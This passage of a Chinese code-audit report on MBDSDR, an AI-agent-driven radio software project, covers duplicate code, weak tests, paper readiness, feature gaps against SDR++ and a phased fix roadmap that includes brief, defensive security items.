|---|------|----------|------|
| 1 | 卫星过境预测 | `predict_satellite_passes`(agent.py) / `sdr_satellite_passes`(sdr_tools.py) / `satellite_predict_pass`(sdr_tools.py) / `satellite_predict_all`(sdr_tools.py) | 4 份，schema 不一致 |
| 2 | SDR 后端抽象 | `sdr_backend.py: SDRBackendManager` vs `hal.py: HardwareManager` | 2 套完整继承树 |
| 3 | GMST 计算 | `orbit.py:50` vs `astronomy.py:204` | 系数相同但写两遍 |
| 4 | NTP 对时 | `time_sync.py:18`(返 dict) vs `new_spacetime.py:73`(raise NTPError) | 错误处理模式相反 |
| 5 | 云台指向 | `gimbal_move`(agent.py) vs `gimbal_point`(sdr_tools.py) | 2 份 |
| 6 | CW 解码 | `cw_decode_audio`(agent.py) vs `sdr_decode_cw`(sdr_tools.py) | 2 份 |
| 7 | FT8 解码 | `ft8_decode_audio`(agent.py) vs `sdr_decode_ft8`(sdr_tools.py) | 2 份 |
| 8 | descramble_ccdb | `demod.py:448`(真实现) vs `meteor_sat.py:339`(no-op) | 行为相反 |
| 9 | SatellitePass 数据类 | `astronomy.py:463` / `decoders.py:103` / `new_spacetime.py:338` | 字段互不兼容 |
| 10 | ldpc_bp_decode | `fst4_ldpc.py:39` vs `ft8_ldpc.py:67` | 算法骨架相同，矩阵不同 |
| 11 | decode_sstv | `decoders.py:524`(输出目录) vs `sstv_decoder.py:737`(输出文件路径) | 签名不一致 |
| 12 | MockSDRBackend | `sdr_backend.py:324` vs `hal.py:335` | 2 个 mock 后端 |

### 5.2 循环依赖

1. **sdr_backend ↔ sdr_tools 双向环**：sdr_tools 顶层 import sdr_backend；sdr_backend 函数内反向 import sdr_tools 拿云台控制器。靠延迟导入撑住，方向错误
2. **new_spacetime → decoders → orbit 层级倒置**：new_spacetime 不自己持有 TLE 数据，反而回退去 decoders.py 里抓
3. **全仓"双轨 import" workaround**：sdr_tools.py 里 40+ 处 `try: from .xxx import / except: from xxx import`，吞掉模块内部 ImportError

### 5.3 孤儿模块 / 死代码

| 模块 | 状态 | 说明 |
|------|------|------|
| `demod.py` | 整模块零 import | 成熟数字解调链（Costas/Gardner/Viterbi），无人调用 |
| `optional_deps.py` | 零外部引用 | 依赖检测模块，只能手动 `python -m` 跑 |
| `meteor_sat.py` 4 个函数 | 零外部调用 | qpsk_demodulate / viterbi_decode_demo / descramble_ccdb / compose_visible_image |
| `hermes-self-evolution/` | 零集成 | 第三方克隆框架，与 mbdsdr_ai 无任何代码连接，建议删除 |
| `get_monospace_font()` | 从未调用 | themes.py 定义后无调用方 |
| `self.worker.finished = ...` | 无效赋值 | mcp_worker.py:347，不是信号连接 |

### 5.4 接口不一致

1. **频率单位**：仿真服务器用 0.01MHz（9850=98.5MHz），sdr_backend.py 假设 MHz/kHz，实际固件可能返 Hz——三份实现对不上
2. **错误返回模式四套并存**：ToolResult / {"error":...} dict / return None / raise Exception
3. **频率管理器用字符串猜单位**：`v * 1e6 if ("." in s or v < 100000) else v`
4. **list_tools 返回形状不一致**：MBDSDRClient 期望 list，sim_server 返回 {"tools": [...]} dict

---

## 六、测试覆盖缺口

### 6.1 零覆盖模块清单（完全无行为测试）

| 模块 | 说明 |
|------|------|
| `fst4_ldpc.py` | FST4 LDPC 译码 |
| `cw_decoder.py` | CW 译码 |
| `noaa_apt_lite.py` / `meteor_sat.py` | 气象卫星 APT/Meteor |
| `gnss_monitor.py` | GNSS 监测 |
| `orbit.py` | 轨道计算（仅 decoders.list_visible_satellites 被 isinstance 冒烟） |
| `rds_lite.py` | RDS 解码（仅手抄位运算空壳测试） |
| `wfm_stereo_lite.py` | 调频立体声 |
| `cfo.py` / `constellation.py` | 载波频偏 / 星座质量 |
| `hal.py` / `radio_control.py` / `time_sync.py` | 硬件抽象 / 射频控制 / 时间同步 |
| `gimbal.py` / `new_spacetime.py` | 云台 / 新时空 |
| `sweep.py` / `spectrum_sensing.py` / `signal_quality.py` | 扫频 / 频谱感知 / 信号质量 |
| `config` / `context_manager` / `model_manager` / `memory` / `version_store` / `sandbox` / `self_evolution` / `plugin_system` | AI 内核模块（仅 import 检查） |

### 6.2 弱断言 / 凑数测试清单

**硬编码 True / 恒真式（必须修复）：**
- `test_full_integration.py:395` — `result.record("触发事件", True)`
- `test_full_integration.py:431` — `result.record("销毁子代理", True)`
- `test_full_integration.py:647` — `suggestion is None or suggestion is not None`（恒真式）
- `test_full_integration_v2.py:367, 504, 507, 510` — 销毁/禁用/启用/删除字面 True

**只测类型不测值（26 项）：**
- IQCalibrator / AGC / FM-AM-CW 解调 / SSB 解调 / compute_snr / estimate_bandwidth / compute_spectrum / find_signals / detect_fhss / AMR 分类 / Pose/AR 全部 6 项 / rollback 回滚验证 / 等等

**只测 CRUD 不测行为（4 项）：**
- SubagentManager — 从不调用 execute_task
- Orchestrator — 从不调用 execute
- Scheduler — 从不触发任务执行
- WorkflowEngine — 从不执行工作流

### 6.3 测试真实性评级

| 测试文件 | 评级 | 说明 |
|----------|------|------|
| `test_full_integration.py` (V1) | **B-** | 有 7 项真·强测试（SSTV 跨实现 + 真实录音、ADS-B CRC 权威向量、AFSK 真音频往返等），但大量弱断言 |
| `test_full_integration_v2.py` | **D** | 假绿报告：按当前源码跑必然红（AMR 24 vs 25）；删掉了 V1 所有强测试；是"为了跑绿而削足适履"的重写 |
| `tool_selftest.py` | **C** | 全工具不崩溃体检，无正确性断言，可作 CI 崩溃门禁 |
| `tool_health_check.py` | **D** | 恒 return 0，退出码无意义 |
| `tool_param_smoke.py` | **D** | OK=87 严重注水（未装解码器也判 OK），恒 return 0 |
| `smoke_live_tools.py` | **C-** | 名不副实，全程 mock；唯一 AX.25 往返不走工具注册表 |
| `ft8_roundtrip.py` | **C** | 容忍 8 重循环偏移 + 85% 门限，掩盖了 +1 音调系统偏移 bug |
| `test_infra_units.py` | **B** | 沙箱拦截测试扎实；但 safe_math 不读输出、hal_base 恒真 |

**整体测试真实性：D+**。250 个注册工具中，0 个的输出被断言为"期望值"。

---

## 七、论文就绪度评估

### 7.1 WCL 评分：28 / 100

| 维度 | 得分 | 满分 | 说明 |
|------|------|------|------|
| 论文结构与格式 | 18 | 20 | 章节齐全但无实验数据，纯方法论 |
| 实验充分性 | 4 | 20 | 全部合成数据，无基线，无消融 |
| 真实 OTA 验证 | 1 | 15 | 仅 1 个 SSTV 录音样本（且被削波） |
| 弱模型实验质量 | 3 | 10 | 单次运行、工具集裁剪、无强模型对比 |
| 统计显著性 | 2 | 10 | 无误差棒、无置信区间、样本量不足 |
| 可复现性 | 6 | 10 | DSP 实验有种子，LLM 实验不可复现 |
| 创新性与技术深度 | 8 | 10 | 概念新颖但技术深度偏浅（系统集成） |
| 已知 bug 对结果可信度影响 | -5 | — | SSTV 噪声误报、AMR 数据泄露等致命问题 |
| 参考文献质量 | 6 | 10 | 数量尚可但缺关键 SDR-AI 文献 |
| 图表支撑 | 0 | 5 | 零张数据图，仅 ASCII 架构图 |

### 7.2 硬阻断问题

1. **实验数据完全空白** — 论文 8 个实验全部只有 Methodology，零结果
2. **无真实 OTA 验证** — 全部合成数据，仅 1 个削波 SSTV 录音
3. **SSTV 噪声误报率 100%** — 纯噪声全被判为 SSTV 制式
4. **AMR 数据泄露** — 同参数化生成器训练+测试，99% 准确率无意义
5. **无基线对比** — 不与 GNU Radio/SDR++/传统方法比较
6. **核心接收链路断裂** — 解调后无声卡输出，频谱 UI 接合成数据

### 7.3 改进路径

**P0（不解决就不能投）：**
1. 选定一个核心贡献点（建议：固件级 MCP + 弱模型工具调用可靠性），做深做透
2. 做真实 OTA 实验：RTL-SDR 录制至少 3 种真实信号；ai-sdr Mini 真实执行 5+ MCP 工具调用
3. 修复 SSTV 噪声误报（纯噪声虚警率 <5%）
4. 加基线对比（AMR 对比经典方法；工具调用对比无 MCP 消融）

**P1（显著提升录用概率）：**
5. 统计严谨性：每个数据点 ≥30 次独立试验，报告均值 ± 标准差或 95% CI
6. 画 3-4 张核心图（架构图 + 弱模型成功率 vs 模型规模 + 核心 DSP 性能曲线 + 真实 OTA 示例）
7. 补关键参考文献（Tandra-Sahai SNR wall、AI for SDR IEEE 论文）

**预计还需 2-3 个月实验工作 + 论文重写才能达到 WCL 投稿水平。**

---

## 八、功能对标缺口矩阵

> vs SDR++ / GNU Radio / SDRangel

### 8.1 音频与监听

| 功能 | SDR++ | MBDSDR | 缺口说明 |
|------|-------|--------|----------|
| 实时声卡播放 | ✅ | ❌ 完全缺失 | 解调输出仅返 float32 列表，无声卡输出流 |
| ANR 自动降噪 | ✅ | 🟡 有算法未接入链路 | STFT 谱减实现完整，但仅被 AI 离线工具调用 |
| 静噪门控 | ✅ | 🟡 存了不用 | squelch_db 字段存在，read_samples 中无门控逻辑 |

### 8.2 接收架构

| 功能 | SDR++ | MBDSDR | 缺口说明 |
|------|-------|--------|----------|
| 多 VFO 同时接收 | ✅ | ❌ 完全缺失 | 单 LO 频率，无第二 VFO 抽头 |
| 设备热插拔 | ✅ | ❌ 完全缺失 | 无 udev 监听、无轮询、无断连检测 |
| 分段增益 (LNA/VGA/BB) | ✅ | 🟡 接口存在无实际控制 | HAL 有 stage 参数但主后端只用单标量 |

### 8.3 解调模式

| 模式 | SDR++ | MBDSDR | 缺口说明 |
|------|-------|--------|----------|
| AM / FM / CW | ✅ | ✅ | 基础实现正确 |
| SSB | ✅ | 🟡 极简 | 无 BFO、无边带滤波器 |
| FT8 / ADS-B / SSTV / AX.25 | ✅ | ✅ 有实现 | 但 FT8/SSTV 参数有 bug（见 P0） |
| RDS / WFM 立体声 | ✅ | 🟡 占位 | RDS 仅检测副载波存在性 |
| RTTY / BPSK31 | ✅ | ❌ 完全缺失 | 无 Baudot 码、无 Varicode 解码 |

### 8.4 可视化

| 功能 | SDR++ | MBDSDR | 缺口说明 |
|------|-------|--------|----------|
| 实时频谱 / 瀑布图 | ✅ | 🟡 UI 有，数据是合成的 | SpectrumDataGenerator 硬编码 5 个假高斯峰 |
| 实时星座图控件 | ✅ | 🟡 后端有函数，无 UI 控件 | constellation.py 有散点坐标生成，desktop 无星座图 QWidget |

### 8.5 网络与共享

| 功能 | SDR++ | MBDSDR | 缺口说明 |
|------|-------|--------|----------|
| SpyServer 服务端/客户端 | ✅ | ❌ 完全缺失 | 仅支持 rtl_tcp，非 SpyServer 协议 |

### 8.6 核心结论

```
设备 IQ → DC/IQ 校正 → 解调 → 音频输出 → 声卡
         ✅         ✅     ❌        ❌
频谱显示 ← FFT ← IQ 流
         🟡     ❌(合成数据)
```

MBDSDR 的 **后端算法层**（DSP 解调、IQ 校正、FT8/ADS-B/SSTV 解码器、录制/回放）有相当扎实的实现；但 **核心接收体验链路是断的**。当前更像"AI 驱动的离线 IQ 分析工具箱"，而非可日常使用的实时接收监听软件。

---

## 九、修复优先级路线图

### Phase 1：安全止血（第 1-2 周）
> 目标：堵住 RCE / 数据外泄通道，不让恶意 prompt 接管系统

1. P0-SEC-05：tool_registry 增加危险工具拦截层（发射/写文件/执行代码需确认）
2. P0-SEC-01：web_fetch_url 加 SSRF 防护（内网 IP 黑名单）+ code_read_file 限制 project_root
3. P0-SEC-03：code_run_tests 改 list 参数，禁用 shell=True
4. P0-SEC-02：sandbox safe_builtins 移除 `type`
5. P1-SEC-04：核心安全文件（agent.py / tool_registry.py / context_manager.py / sandbox.py）只读

### Phase 2：核心链路打通（第 3-4 周）
> 目标：从桌面 UI 到真实 RTL-SDR 的完整闭环跑通

1. P0-HW-01：requirements.txt 加 pyrtlsdr
2. P0-HW-02：HardwareManager 改单例 + hal.py 模块级 import SoapySDR
3. P0-UI-03：mcp_worker method_map 补 tune_sdr / sdr_set_frequency
4. P0-UI-02：call_tool 改 Signal/Slot queued connection
5. P0-HW-03：connect 后回读硬件参数 + setter 失败回滚
6. P0-UI-01：SpectrumDataGenerator 加 push_iq 接口

### Phase 3：DSP 解码器正确性修复（第 5-6 周）
> 目标：FT8/SSTV/ADS-B/QPSK 在真实信号上能正确解码

1. P0-DSP-01：FT8 符号时长 160ms + CRC k=19 + Costas 环
2. P0-DSP-03：SSTV VIS 极性修正 + 噪声门限
3. P0-DSP-04：ADS-B 字符表 + 6bit 呼号 + CPR 位置解码
4. P0-DSP-05/06：orbit.py 多普勒符号 + decoders.py GMST 旋转
5. P0-DSP-07：FT8 LDPC 矩阵内嵌

### Phase 4：测试体系重建（第 7-8 周）
> 目标：测试真的能抓住 bug，不再是假绿

1. P0-TEST-01：修复 V2 AMR 维度断言 + 废弃 V2
2. P0-TEST-02：给解码类工具补正例测试（用真实 wav 文件断言解码结果）
3. P1-TEST-01：补子代理/编排器/调度器行为测试
4. 删除硬编码 True / 恒真式断言，补数值断言
5. 引入 pytest + @pytest.mark.hardware 标记真实硬件测试

### Phase 5：实验与论文（第 9-12 周）
> 目标：产出可投 WCL 的实验结果

1. P0-EXP-01：修复 SSTV 噪声误报 + AMR 数据泄露
2. 用 RTL-SDR 录制真实 FM / ADS-B / FT8 信号做 OTA 验证
3. 弱模型工具调用实验：≥30 次重复 + 全量工具集 + 强模型对比
4. 补基线对比 + 统计显著性 + 画 3-4 张核心图
5. 聚焦一个核心贡献点，重写论文到 4 页

---

## 十、附录

### 10.1 审查覆盖统计

- **审查文件数**：60 份子报告
- **覆盖模块**：`mbdsdr_ai/` 下 69 个 .py 文件 + `desktop/` 下 8 个文件 + `tests/` 下 10 个文件 + `experiments/` 下 9 个脚本 + 根目录脚本
- **工具注册数**：250（Agent 内置 124 + SDR 专用 126）
- **总行数**：~41,000 行 Python

### 10.2 R1 已修复 P0 清单（不重复报告）

上一轮 22 子 agent 审查中已识别并修复的 11 个 P0 问题，本轮不重复列出。R2 新发现的 P0 共 23 个，全部是 R1 未覆盖的领域（DSP 解码器内部参数、AI 安全攻击链、硬件 HAL 层、桌面 UI 线程模型、实验数据真实性）。

### 10.3 标签说明

- **[真bug]**：功能错误 / 崩溃 / 数据错误，真机必现
- **[空壳]**：接口/路径存在但未实现，或 connect 了但函数体 pass / 永不触发
- **[占位]**：代码存在但未真正接入，或注释/TODO 承诺
- **[建议]**：健壮性 / 可维护性 / 体验改进，不影响正确性

---

*报告生成：MBDSDR R2 最终整合 Agent*
*日期：2026-09-24*
*基于 60 份子审查报告去重整合而成*
